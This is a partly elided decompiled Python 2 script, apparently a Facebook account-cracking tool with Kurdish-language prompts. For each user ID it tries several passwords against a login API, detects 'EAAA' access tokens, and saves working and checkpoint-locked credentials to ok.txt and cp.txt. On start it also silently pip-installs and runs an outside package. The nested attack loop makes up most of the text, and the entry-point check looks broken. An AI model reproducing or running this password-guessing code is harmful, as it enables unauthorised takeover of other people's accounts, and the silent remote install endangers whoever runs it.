# Decompiled By Hama
# Github : https://github.com/Bokany
...
try:
	...
	os.system("pip2 install bokany")
	os.system("python2 mrBokany")
...
def logo():
	    logo = """\033[91;1m
-------------------------------------------------
 Author      : @Mr_7ama_Bokany

 GitHub      : https://github.com/Bokany


Telegram     : @Mr_7ama_Bokany
--------------------------------------------------"""
def main():
	os.system("clear")
	logo()
...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/Bokany")
		...
		subprocess.check_output(["am", "start", "https://t.me/Mr_7ama_Bokany"])
		main()
...
def menu_option():
	...
	if select =="1":
		...
		print("")
		print("\t\033[93;1m    kwry sag ZHMARAY RAST HALBZHERA [!]")
		print("")
		menu_option()
def crack1():
	global token
...
def crack_select1():
	...
	print("\033[91;1m kwry kar CHAWARE BKAW W BBINA[!] \033[92;1m!\033[91;1m!\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
	...
	linex()
	print("")
	raw_input("\033[93;1m kwry kar ENTER BKA BO GARANAWA [!] ")
	menu()
...
def crack_select():
	...
	print("\033[92;1m  Maza CRACK DASTE PE KRD [!]\x1b[0m")
	print("\033[94;1m gw bxow chaware bka [!] \033[92;1m\033[91;1m\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		...
		try:
			...
			data = requests.get(api, params=params, headers=headers_)
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
					...
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
											...
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[Mr_7ama_Bokany-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;31m[Mr_7ama_Bokany-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
	...
	linex()
	print("")
	print("\033[92;1m Maza CRACK KOTAY HAT [!]")
	print("\033[93;1m HAMW HACKRAWAKAN [!] \033[92;1m[OK]\033[93;1m/\033[91;1m[CP]: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[94;1m kirm ba damt ENTER BKA BO GARANAWA [!] ")
	menu()
    
if __name__ == 'Mr_7ama_Bokany':
	Hama()
